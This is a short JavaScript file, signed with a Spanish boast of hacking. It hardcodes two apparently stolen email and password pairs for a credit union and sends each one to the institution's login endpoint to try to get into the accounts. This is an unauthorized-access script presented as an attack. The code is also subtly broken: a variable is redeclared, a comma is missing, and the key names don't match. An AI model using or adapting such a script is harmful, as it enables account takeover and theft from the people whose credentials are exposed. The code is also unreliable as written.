// Hackeado por el mejor
const axios = require("axios");

const users = [
  {
    usuario: "admin@starkcreditunion.com",
    pass: "acU0Ncy#g@MX"
  },
  {
    usuario: "jfletcher@stark.com",
    pass: "kVAndi%rK9ah"
  }
];

const loginToSystem = async (user) => {
  const { user, pass } = user;
  
  const opts = {
    url: "https://login.stark.com",
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    }
    data: { user, password: pass }
  }

  const info = await axios(opts).then(({ data }) => data).catch(error => console.log(error));

  console.log(info);
}

users.map(user => loginToSystem(user));
